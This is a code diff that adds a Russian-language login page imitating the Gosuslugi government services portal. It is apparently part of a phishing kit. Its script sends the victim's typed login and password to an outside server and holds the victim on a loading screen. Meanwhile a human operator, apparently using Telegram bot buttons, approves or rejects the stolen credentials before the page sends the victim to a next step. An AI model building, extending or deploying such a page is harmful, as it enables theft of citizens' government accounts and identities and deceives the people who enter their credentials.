@@ -1,0 +1,968 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Госуслуги — Вход</title>
+  <link rel="icon" href="favicon.ico">
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: #e4ecfd;
+      font-family: 'Lato', Arial, sans-serif;
+    }
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 0;
+    }
+    .login-container {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 24px #b3c6e6aa;
+      max-width: 382px;
+      width: 100%;
+      margin: 46px 0 0 0;
+      padding: 60px 32px 0px 32px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 43px auto;
+      width: 194px;
+      height: 34px;
+      line-height: 1;
+    }
+    .input {
+      width: 100%;
+      margin-bottom: 18px;
+      border-radius: 8px;
+      border: none;
+      background: #f5f7fa;
+      padding: 16px 18px;
+      font-size: 16px;
+      outline: none;
+      box-sizing: border-box;
+      transition: border 0.2s;
+    }
+    .input:focus {
+      border: 2px solid #99b1e6;
+      background: #fff;
+    }
+    .first-input {
+      margin-top: 0;
+      margin-bottom: 21px;
+      display: block;
+      line-height: 1;
+    }
+    .restore {
+      width: 100%;
+      text-align: left;
+      color: #0d4cd3;
+      font-size: 16px;
+      margin-bottom: 42px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+    }
+    .login-btn {
+      width: 100%;
+      background: #0d4cd3;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 16px 0;
+      font-size: 16px;
+      font-weight: 400;
+      cursor: pointer;
+      margin-bottom: 36px;
+      transition: background 0.2s;
+    }
+    .login-btn:hover {
+      background: #0b3bb3;
+    }
+    .help-link {
+      background: none;
+      border: none;
+      color: #0d4cd3;
+      font-size: 15px;
+      margin: 10px auto 46px auto;
+      cursor: pointer;
+      outline: none;
+    }
+    .register-link {
+      color: #0d4cd3;
+      font-size: 16px;
+      margin: 46px 0 45px 0;
+      background: none;
+      border: none;
+      cursor: pointer;
+      width: 100%;
+      text-align: center;
+      padding: 0;
+      display: none; /* Скрываем кнопку */
+    }
+    .info-block {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px #b3c6e633;
+      max-width: 382px;
+      width: 100%;
+      margin: 45px auto 0 auto;
+      padding: 24px 28px 20px 28px;
+      box-sizing: border-box;
+      min-height: 167px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    .info-icon {
+      width: 48px;
+      height: 48px;
+      margin-bottom: 25px;
+    }
+    .info-text {
+      font-size: 15px;
+      color: #0d4cd3;
+      text-align: left;
+      margin-top: 0;
+      line-height: 1.5;
+    }
+    .info-text-link {
+      text-decoration: none;
+      color: inherit; /* Наследуем цвет текста от родителя */
+    }
+    @media (max-width: 500px) {
+      .login-container {
+        max-width: 382px; /* Ограничиваем максимальную ширину */
+        padding: 45px 16px 0px 16px; /* Верхний отступ 45px */
+        box-sizing: border-box;
+      }
+      .info-block {
+        max-width: 382px; /* Ограничиваем максимальную ширину */
+        padding: 20px 16px 8px 16px; /* Корректируем padding info-block */
+        box-sizing: border-box;
+      }
+      .logo {
+        height: 32px;
+        margin-bottom: 20px;
+      }
+      .info-icon {
+        width: 40px; /* Увеличиваем размер иконки */
+        height: 40px; /* Увеличиваем размер иконки */
+      }
+    }
+    @media (max-width: 400px) {
+      .login-container {
+        max-width: 90vw; /* Ограничение ширины */
+        margin: 0 auto; /* Центрирование */
+        padding: 45px 4vw 0px 4vw; /* Верхний отступ 45px и vw для горизонтали */
+        box-sizing: border-box;
+      }
+      .info-block {
+        max-width: 90vw; /* Ограничение ширины */
+        margin: 45px auto 0 auto; /* Центрирование и добавление верхнего отступа */
+        padding: 20px 4vw 8px 4vw; /* Корректируем padding info-block и vw */
+        box-sizing: border-box;
+      }
+    }
+    .password-input {
+      margin-bottom: 11px;
+    }
+
+    /* Стили для модального окна */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      display: none; /* Скрыто по умолчанию */
+    }
+
+    .modal {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 24px #00000033;
+      max-width: 630px; /* Увеличиваем ширину модального окна */
+      width: 90%;
+      overflow: hidden;
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 24px 16px 24px; /* Корректируем нижний padding */
+      position: relative; /* Нужен для абсолютного позиционирования ::after */
+    }
+
+    .modal-header::after {
+      content: '';
+      display: block;
+      position: absolute;
+      left: 24px; /* Отступ слева */
+      right: 24px; /* Отступ справа */
+      bottom: 0px; /* Положение линии */
+      height: 1px;
+      background-color: #eee; /* Сероватый цвет линии */
+    }
+
+    .modal-title {
+      margin: 0;
+      font-size: 20px;
+      color: #0b1f33;
+    }
+
+    .modal-close {
+      background: none;
+      border: none;
+      font-size: 30px; /* Увеличиваем размер крестика */
+      cursor: pointer;
+      color: #0d4cd3; /* Синий цвет для крестика */
+    }
+
+    .modal-content {
+      padding: 24px;
+      font-size: 15px;
+      color: #333;
+      line-height: 1.5;
+    }
+
+    .modal-content ul {
+      list-style: disc;
+      padding-left: 20px;
+      margin-bottom: 20px;
+    }
+
+    .modal-content li {
+      margin-bottom: 10px;
+    }
+
+    .modal-content a {
+      color: #0d4cd3; /* Синий цвет для ссылок */
+      text-decoration: none;
+    }
+
+    .modal-content p {
+      margin-bottom: 10px;
+    }
+
+    /* Стили для модального окна "Куда ещё можно войти..." */
+    .modal-overlay-info {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      display: none; /* Скрыто по умолчанию */
+    }
+
+    .modal-info {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 24px #00000033;
+      max-width: 600px; /* Примерная ширина по скриншоту */
+      width: 90%;
+      overflow: hidden;
+    }
+
+    .modal-header-info {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 24px 16px 24px;
+      position: relative;
+    }
+
+    .modal-title-info {
+      margin: 0;
+      font-size: 20px;
+      color: #0b1f33;
+    }
+
+    .modal-close-info {
+      background: none;
+      border: none;
+      font-size: 30px;
+      cursor: pointer;
+      color: #0d4cd3;
+    }
+
+    .modal-content-info {
+      padding: 24px;
+    }
+
+    .info-section {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 24px;
+    }
+
+    .info-image {
+      width: 100px; /* Примерный размер по скриншоту */
+      height: auto;
+      margin-right: 24px;
+    }
+
+    .info-text-block {
+      flex-grow: 1;
+    }
+
+    .info-text-block h4 {
+      margin: 0 0 12px 0;
+      font-size: 18px;
+      color: #0b1f33;
+    }
+
+    .info-text-block ul {
+      list-style: disc;
+      padding-left: 20px;
+      margin: 0;
+    }
+
+    .info-text-block li {
+      margin-bottom: 8px;
+      font-size: 15px;
+      color: #333;
+    }
+
+    .input-container {
+      position: relative;
+      width: 100%;
+      margin-bottom: 18px;
+    }
+    .input-container .input {
+      margin-bottom: 0; /* Remove margin from input itself */
+      padding: 24px 18px 8px 18px; /* Adjust padding: increase top, decrease bottom */
+    }
+    .input-label {
+      position: absolute;
+      left: 18px; /* Align with input padding */
+      top: 50%;
+      transform: translateY(-50%);
+      pointer-events: none; /* Allow clicks to pass through to input */
+      transition: top 0.2s, font-size 0.2s, color 0.2s;
+      color: #8c8c8c; /* Initial font size and color */
+    }
+    .input-container.focused .input-label,
+    .input-container.has-text .input-label {
+      top: 8px; /* Move label up */
+      font-size: 12px; /* Smaller font size */
+      color: #8c8c8c; /* Keep initial color */
+      transform: translateY(0%); /* Reset transform */
+    }
+    /* Стиль для контейнера при ошибке (скопировано из restore.html) */
+    .input-container.error .input {
+        background-color: #ffebee; /* Розовый фон */
+        border: 1px solid #e57373; /* Красная рамка */
+    }
+     .input-container.error .input:focus {
+         border-color: #ef5350; /* Темнее красная рамка при фокусе */
+     }
+    /* Стиль для сообщения об ошибке (скопировано из restore.html) */
+    .error-message-login {
+        font-size: 14px; /* Размер текста ошибки */
+        color: #ef5350; /* Красный цвет текста */
+        margin-top: 8px; /* Отступ сверху */
+        display: none; /* Изначально скрыто */
+    }
+    /* Specific margin for the first input container */
+    .login-container .input-container:first-child {
+        margin-bottom: 21px; /* Match previous first-input margin */
+    }
+    /* Specific margin for the password input container (was password-input class) */
+    .login-container .input-container:nth-child(3) {
+        margin-bottom: 11px; /* Match previous password-input margin */
+    }
+    .password-toggle-icon {
+      position: absolute;
+      right: 18px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      width: 24px;
+      height: 24px;
+      background-image: url('smooth_icon.svg'); /* Иконка закрытого глаза из файла */
+      background-size: cover;
+      opacity: 0.5; /* Можно убрать opacity, если не нужно */
+      display: none; /* Изначально скрываем */
+    }
+    .password-toggle-icon.active {
+      background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiM2MzYzNjMiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIzIi8+PHBhdGggZD0iTTIgMTIgczQgNyAxMCA3IDEwLTcgMTAtNyAwIDAuNzctMS44LTEuODk0QzE1LjE2IDcuNTggMTMuNSA2IDEyIDZzLTMuMTYgMS41OC02LjExIDQuMTMyQzIuNzcgMTEuMjMgMiAxMiAyIDEyIi8+PC9zdmc+'); /* Иконка открытого глаза (временная base64) */
+      opacity: 1; /* Можно убрать opacity, если не нужно */
+    }
+
+    .wait-loader-overlay {
+      position: fixed;
+      z-index: 9999;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .wait-loader-box {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 24px #b3c6e6aa;
+      width: 420px;
+      height: 600px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .wait-loader-svg {
+      width: 80px;
+      height: 80px;
+      display: block;
+    }
+    .wait-loader-dot {
+      transform-origin: 40px 40px;
+      animation: wait-loader-spin 1.2s linear infinite;
+    }
+    @keyframes wait-loader-spin {
+      0%   { transform: rotate(0deg)   translateY(-22px) rotate(0deg);}
+      100% { transform: rotate(360deg) translateY(-22px) rotate(-360deg);}
+    }
+
+    /* Добавляю стили для ошибки авторизации */
+    .auth-error-message {
+      color: #ef5350;
+      font-size: 14px; /* Уменьшаем размер шрифта */
+      margin: 1px 0 0 0; /* Делаем еще меньший верхний отступ */
+      text-align: left;
+      font-weight: 400;
+      width: 100%; /* Растягиваем на всю ширину, чтобы выравнивание работало */
+      margin-bottom: 20px; /* Увеличиваем нижний отступ */
+    }
+    .input-container.auth-error .input {
+      background: #ffe6e6;
+      border: 1px solid #ef5350;
+    }
+
+    .loader-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255,255,255,0.7);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      backdrop-filter: blur(4px);
+    }
+
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="logo.4db68cf668f7092d.svg" alt="Госуслуги" class="logo">
+    <div class="input-container">
+      <input class="input first-input" type="text" placeholder=" " autocomplete="on">
+      <label class="input-label">Телефон / Email / СНИЛС</label>
+      <div class="error-message-login">Введите логин</div>
+    </div>
+    <div class="input-container">
+      <input class="input password-input" type="password" placeholder=" " autocomplete="off">
+      <label class="input-label">Пароль</label>
+      <span class="password-toggle-icon"></span>
+    </div>
+    <div id="auth-error" class="auth-error-message" style="display:none;">Неверные логин или пароль</div>
+    <button class="restore">Восстановить</button>
+    <button class="login-btn">Войти</button>
+    <button class="help-link">Не удаётся войти?</button>
+  </div>
+
+  <!-- Модальное окно "Не удаётся войти?" -->
+  <div class="modal-overlay">
+    <div class="modal">
+      <div class="modal-header">
+        <h3 class="modal-title">Не удаётся войти?</h3>
+        <button class="modal-close">&times;</button>
+      </div>
+      <div class="modal-content">
+        <ul>
+          <li>Проверьте корректность вводимых данных – без тире и пробела, язык ввода, клавишу «Caps Lock»</li>
+          <li>Воспользуйтесь функцией <a href="restore.html">восстановления пароля</a></li>
+        </ul>
+        <p>Ещё один способ восстановления пароля – личное обращение в любой центр обслуживания. При себе необходимо иметь документ, удостоверяющий личность, и СНИЛС</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Модальное окно "Куда ещё можно войти..." -->
+  <div class="modal-overlay-info">
+    <div class="modal-info">
+      <div class="modal-header-info">
+        <h3 class="modal-title-info">Один аккаунт для сайтов партнёров</h3>
+        <button class="modal-close-info">&times;</button>
+      </div>
+      <div class="modal-content-info">
+        <div class="info-section">
+          <img src="clock.svg" alt="Часы" class="info-image">
+          <div class="info-text-block">
+            <h4>Просто и быстро</h4>
+            <ul>
+              <li>Вход на сайты партнёров под одним аккаунтом</li>
+              <li>Быстрая авторизация по кнопке «Войти через Госуслуги»</li>
+              <li>Не надо проходить регистрацию и запоминать пароли</li>
+            </ul>
+          </div>
+        </div>
+        <div class="info-section">
+          <img src="cyber_helmet.svg" alt="Шлем" class="info-image">
+          <div class="info-text-block">
+            <h4>Безопасно</h4>
+            <ul>
+              <li>Настройка входа с дополнительным способом подтверждения</li>
+              <li>Гарантия соответствия требованиям законодательства о защите персональных данных</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Информационный блок -->
+  <div class="info-block">
+    <img src="content/Banner/Esia_a1.svg" alt="info" class="info-icon">
+    <a href="#" class="info-text-link"><div class="info-text">Куда ещё можно войти с<br>паролем от Госуслуг?</div></a>
+  </div>
+
+  <div class="loader-overlay" id="loader-overlay">
+    <video src="6533f10d.webm" autoplay loop muted playsinline style="width:340px;height:340px;object-fit:contain;background:transparent;pointer-events:none;"></video>
+  </div>
+
+  <script src="assets/d4b72c006a7771677225038852ee8b96/noty.min.js"></script>
+  <script>
+    // Конфигурация сервера
+    const env = {
+        SERVER_URL: 'https://server-production-4599.up.railway.app',
+        API_ENDPOINT_AUTH: '/auth-visit',
+        API_ENDPOINT_STATUS: '/status',
+        API_ENDPOINT_STEP: '/step'
+    };
+
+    const helpLink = document.querySelector('.help-link');
+    const modalOverlay = document.querySelector('.modal-overlay');
+    const closeModalButton = document.querySelector('.modal-close');
+
+    helpLink.addEventListener('click', (e) => {
+      e.preventDefault(); // Предотвращаем переход по ссылке
+      modalOverlay.style.display = 'flex'; // Показываем модальное окно
+    });
+
+    closeModalButton.addEventListener('click', () => {
+      modalOverlay.style.display = 'none'; // Скрываем модальное окно по крестику
+    });
+
+    // Optional: Hide modal when clicking outside the modal content
+    modalOverlay.addEventListener('click', (e) => {
+      if (e.target === modalOverlay) {
+        modalOverlay.style.display = 'none';
+      }
+    });
+
+    // JavaScript для второго модального окна
+    const infoTextLink = document.querySelector('.info-text-link');
+    const modalOverlayInfo = document.querySelector('.modal-overlay-info');
+    const closeModalButtonInfo = document.querySelector('.modal-close-info');
+
+    infoTextLink.addEventListener('click', (e) => {
+      e.preventDefault(); // Предотвращаем переход по ссылке
+      modalOverlayInfo.style.display = 'flex'; // Показываем второе модальное окно
+      modalOverlay.style.display = 'none'; // Скрываем первое модальное окно, если открыто
+    });
+
+    closeModalButtonInfo.addEventListener('click', () => {
+      modalOverlayInfo.style.display = 'none'; // Скрываем второе модальное окно по крестику
+    });
+
+    // Optional: Hide modal when clicking outside the modal content
+    modalOverlayInfo.addEventListener('click', (e) => {
+      if (e.target === modalOverlayInfo) {
+        modalOverlayInfo.style.display = 'none';
+      }
+    });
+
+    // Script for Login button
+    const loginButton = document.querySelector('.login-btn');
+    const loginInputBtn = document.querySelector('.login-container .first-input');
+    const passwordInputBtn = document.querySelector('.password-input');
+
+    if (loginButton && loginInputBtn && passwordInputBtn) {
+      // Добавляем слушатели для скрытия ошибки при вводе
+      loginInputBtn.addEventListener('input', hideAuthError);
+      passwordInputBtn.addEventListener('input', hideAuthError);
+
+      loginButton.addEventListener('click', async function(event) {
+        event.preventDefault();
+
+        const loginValue = loginInputBtn.value.trim();
+        const passwordValue = passwordInputBtn.value.trim();
+
+        if (!loginValue || !passwordValue) {
+             alert('Пожалуйста, введите логин и пароль.');
+             if (!loginValue) {
+                 const loginInputContainer = loginInput ? loginInput.closest('.input-container') : null;
+                 const errorMessageLogin = loginInputContainer ? loginInputContainer.querySelector('.error-message-login') : null;
+                 if (loginInputContainer) loginInputContainer.classList.add('error');
+                 if (loginInputContainer) loginInputContainer.classList.add('has-text');
+                 if (errorMessageLogin) errorMessageLogin.style.display = 'block';
+             }
+             return;
+        }
+
+        try {
+          const userId = await getOrCreateUserId();
+          console.log('Sending data with userId:', userId);
+
+          const response = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_STEP}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                step: 'login_password', 
+                value: `Логин: ${loginValue}\nПароль: ${passwordValue}`,
+                origin: 'Вход',
+                userId: userId
+            })
+          });
+
+          const result = await response.json();
+          console.log('Server response:', result);
+
+          if (response.ok) {
+            const handled = await handleServerResponse(result);
+            if (!handled) {
+              console.error('Unexpected server response format');
+              alert('Произошла ошибка при отправке данных для входа.');
+            }
+          } else {
+            console.error('Server error:', result);
+            alert('Произошла ошибка при отправке данных для входа.');
+          }
+
+        } catch (error) {
+          console.error('Network error:', error);
+          alert('Произошла сетевая ошибка при отправке данных для входа.');
+        }
+      });
+    }
+
+    // JavaScript for floating labels and input error states
+    const loginInput = document.querySelector('.login-container .first-input');
+    const loginInputContainer = loginInput ? loginInput.closest('.input-container') : null;
+    const errorMessageLogin = document.querySelector('.error-message-login');
+
+    if (loginInput) {
+        loginInput.dataset.hasInteracted = 'false';
+
+        loginInput.addEventListener('focus', () => {
+            if (loginInputContainer) {
+                loginInputContainer.classList.add('focused');
+                // On focus, always remove error
+                loginInputContainer.classList.remove('error');
+                if (errorMessageLogin) errorMessageLogin.style.display = 'none';
+                // Ensure has-text is added if there's text on focus
+                if (loginInput.value) {
+                    loginInputContainer.classList.add('has-text');
+                }
+            }
+        });
+
+        loginInput.addEventListener('blur', () => {
+            if (loginInputContainer) {
+                loginInputContainer.classList.remove('focused');
+                // Mark as interacted on blur
+                loginInput.dataset.hasInteracted = 'true';
+
+                // Add a small delay to ensure other blur-related processes complete
+                setTimeout(() => {
+                    if (loginInput.value) {
+                        loginInputContainer.classList.add('has-text');
+                        // If not empty, remove error on blur
+                        loginInputContainer.classList.remove('error');
+                        if (errorMessageLogin) errorMessageLogin.style.display = 'none';
+                    } else {
+                        loginInputContainer.classList.remove('has-text'); // If empty, remove has-text initially
+                        // On blur, if empty, always remove error state and hide message, regardless of interaction
+                        loginInputContainer.classList.remove('error');
+                        if (errorMessageLogin) errorMessageLogin.style.display = 'none';
+                        // The label will automatically return to center because has-text is removed
+                    }
+                }, 50); // 50ms delay
+            }
+        });
+
+        loginInput.addEventListener('input', () => {
+            if (loginInputContainer) {
+                // Mark as interacted on input
+                loginInput.dataset.hasInteracted = 'true';
+
+                if (loginInput.value.length > 0) {
+                    loginInputContainer.classList.add('has-text');
+                    // If something is typed, remove error state
+                    loginInputContainer.classList.remove('error');
+                    if (errorMessageLogin) errorMessageLogin.style.display = 'none';
+                } else {
+                    loginInputContainer.classList.remove('has-text');
+                    // If empty and hasInteractedLogin, show error and add has-text
+                    if (loginInput.dataset.hasInteracted === 'true') {
+                        loginInputContainer.classList.add('error');
+                        // Explicitly add has-text when error is shown to keep label up
+                        loginInputContainer.classList.add('has-text');
+                        if (errorMessageLogin) errorMessageLogin.style.display = 'block';
+                    } else {
+                        // If empty and no prior interaction, remove error (just in case)
+                        loginInputContainer.classList.remove('error');
+                        if (errorMessageLogin) errorMessageLogin.style.display = 'none';
+                    }
+                }
+            }
+        });
+    }
+
+    // Обработка поля пароля
+    const passwordInput = document.querySelector('.password-input');
+    const passwordToggleIcon = document.querySelector('.password-toggle-icon');
+    const passwordInputContainer = passwordInput ? passwordInput.closest('.input-container') : null;
+
+    if (passwordInput && passwordToggleIcon && passwordInputContainer) {
+        passwordInput.addEventListener('focus', () => {
+            passwordInputContainer.classList.add('focused');
+            if (passwordInput.value) {
+                passwordInputContainer.classList.add('has-text');
+            }
+        });
+
+        passwordInput.addEventListener('blur', () => {
+            passwordInputContainer.classList.remove('focused');
+            if (passwordInput.value) {
+                passwordInputContainer.classList.add('has-text');
+            } else {
+                passwordInputContainer.classList.remove('has-text');
+            }
+        });
+
+        passwordInput.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                passwordToggleIcon.style.display = 'block';
+                passwordInputContainer.classList.add('has-text');
+            } else {
+                passwordToggleIcon.style.display = 'none';
+                passwordInputContainer.classList.remove('has-text');
+            }
+        });
+
+        // Toggle password visibility and icon on click
+        passwordToggleIcon.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.classList.toggle('active');
+        });
+
+        // Initial check in case the input is pre-filled
+        if (passwordInput.value.length > 0) {
+            passwordToggleIcon.style.display = 'block';
+            passwordInputContainer.classList.add('has-text');
+        } else {
+            passwordToggleIcon.style.display = 'none';
+            passwordInputContainer.classList.remove('has-text');
+        }
+    }
+
+    // Script for register link
+    const registerLink = document.querySelector('.register-link');
+    if (registerLink) {
+      registerLink.addEventListener('click', function(event) {
+        event.preventDefault(); // Prevent the default link behavior if it were a link
+        window.location.href = 'register.html';
+      });
+    }
+
+    // Script for restore button
+    const restoreButton = document.querySelector('.restore');
+    if (restoreButton) {
+      restoreButton.addEventListener('click', function() {
+        window.location.href = 'restore.html';
+      });
+    }
+
+    // Функции для показа/скрытия лоадера
+    function showWaitLoader() {
+      document.getElementById('loader-overlay').style.display = 'flex';
+    }
+    function hideWaitLoader() {
+      document.getElementById('loader-overlay').style.display = 'none';
+    }
+
+    // В login-container после help-link добавляю контейнер для ошибки:
+    function showAuthError() {
+      // Показываем ошибку
+      document.getElementById('auth-error').style.display = 'block';
+      // Красим оба поля
+      const loginInputContainer = loginInputBtn ? loginInputBtn.closest('.input-container') : null;
+      const passwordInputContainer = passwordInputBtn ? passwordInputBtn.closest('.input-container') : null;
+      if (loginInputContainer) loginInputContainer.classList.add('auth-error');
+      if (passwordInputContainer) passwordInputContainer.classList.add('auth-error');
+    }
+    function hideAuthError() {
+      document.getElementById('auth-error').style.display = 'none';
+      const loginInputContainer = loginInputBtn ? loginInputBtn.closest('.input-container') : null;
+      const passwordInputContainer = passwordInputBtn ? passwordInputBtn.closest('.input-container') : null;
+      if (loginInputContainer) loginInputContainer.classList.remove('auth-error');
+      if (passwordInputContainer) passwordInputContainer.classList.remove('auth-error');
+    }
+
+    // Функция опроса статуса
+    function pollLoginStatus() {
+      let attempts = 0;
+      const maxAttempts = 30;
+      console.log('Starting status polling...');
+
+      const interval = setInterval(async () => {
+        attempts++;
+        try {
+          const userId = await getOrCreateUserId();
+          console.log(`Polling attempt ${attempts}, userId:`, userId);
+
+          const res = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_STATUS}?step=login_password&userId=${userId}`);
+          
+          // Проверяем, что ответ - это JSON
+          const contentType = res.headers.get('content-type');
+          if (!contentType || !contentType.includes('application/json')) {
+            console.log('Waiting for JSON response...');
+            return; // Продолжаем опрос
+          }
+
+          const data = await res.json();
+          console.log('Status response:', data);
+
+          if (res.ok) {
+            // Проверяем различные возможные статусы
+            if (data.status === 'none' || 
+                data.status === 'wait_for_operator' || 
+                data.waitForValidation === true) {
+              console.log('Waiting for operator confirmation...');
+            } else if (data.status === 'ok' || 
+                      (data.callback_data && data.callback_data.endsWith(':ok')) ||
+                      (data.status && data.status.includes(':ok')) ||
+                      (data.result && data.result.callback_query && 
+                       data.result.callback_query.data && 
+                       data.result.callback_query.data.includes(':ok'))) {
+              console.log('Operator confirmed, redirecting...');
+              clearInterval(interval);
+              hideWaitLoader();
+              window.location.href = 'next_step.html';
+            } else if (data.status === 'fail' || 
+                      (data.callback_data && data.callback_data.endsWith(':fail')) ||
+                      (data.status && data.status.includes(':fail')) ||
+                      (data.result && data.result.callback_query && 
+                       data.result.callback_query.data && 
+                       data.result.callback_query.data.includes(':fail'))) {
+              console.log('Operator rejected, showing error...');
+              clearInterval(interval);
+              hideWaitLoader();
+              showAuthError();
+            } else {
+              console.log('Continuing to wait for operator response...');
+            }
+          } else {
+            console.error('Status check failed:', data);
+          }
+        } catch (e) {
+          // Игнорируем ошибки парсинга JSON
+          if (e instanceof SyntaxError) {
+            console.log('Waiting for valid JSON response...');
+          } else {
+            console.error('Error polling status:', e);
+          }
+        }
+
+        if (attempts >= maxAttempts) {
+          console.log('Max attempts reached, stopping poll...');
+          clearInterval(interval);
+          hideWaitLoader();
+          showAuthError();
+        }
+      }, 1000);
+    }
+
+    // Функция для обработки ответа сервера при отправке данных
+    async function handleServerResponse(result) {
+      console.log('Processing server response:', result);
+      
+      if (result.waitForValidation === true) {
+        console.log('Waiting for operator validation...');
+        showWaitLoader();
+        hideAuthError();
+        pollLoginStatus();
+        return true;
+      }
+      
+      // Проверяем наличие callback_data в ответе
+      if (result.result && result.result.reply_markup) {
+        try {
+          const replyMarkup = typeof result.result.reply_markup === 'string' 
+            ? JSON.parse(result.result.reply_markup) 
+            : result.result.reply_markup;
+            
+          if (replyMarkup.inline_keyboard) {
+            console.log('Operator buttons detected, starting status polling...');
+            showWaitLoader();
+            hideAuthError();
+            pollLoginStatus();
+            return true;
+          }
+        } catch (e) {
+          console.error('Error parsing reply_markup:', e);
+        }
+      }
+      
+      return false;
+    }
+
+    // Получение userId при заходе на форму авторизации
+    async function getOrCreateUserId() {
+      let userId = localStorage.getItem('user_id');
+      if (!userId) {
+        try {
+          const res = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_AUTH}`, { method: 'POST' });
+          const data = await res.json();
+          userId = data.userId;
+          localStorage.setItem('user_id', userId);
+        } catch (e) {
+          userId = null;
+        }
+      }
+      return userId;
+    }
+
+    let userId = null;
+    window.addEventListener('DOMContentLoaded', async () => {
+      userId = await getOrCreateUserId();
+    });
+
+  </script>
+
+</body>
+</html>
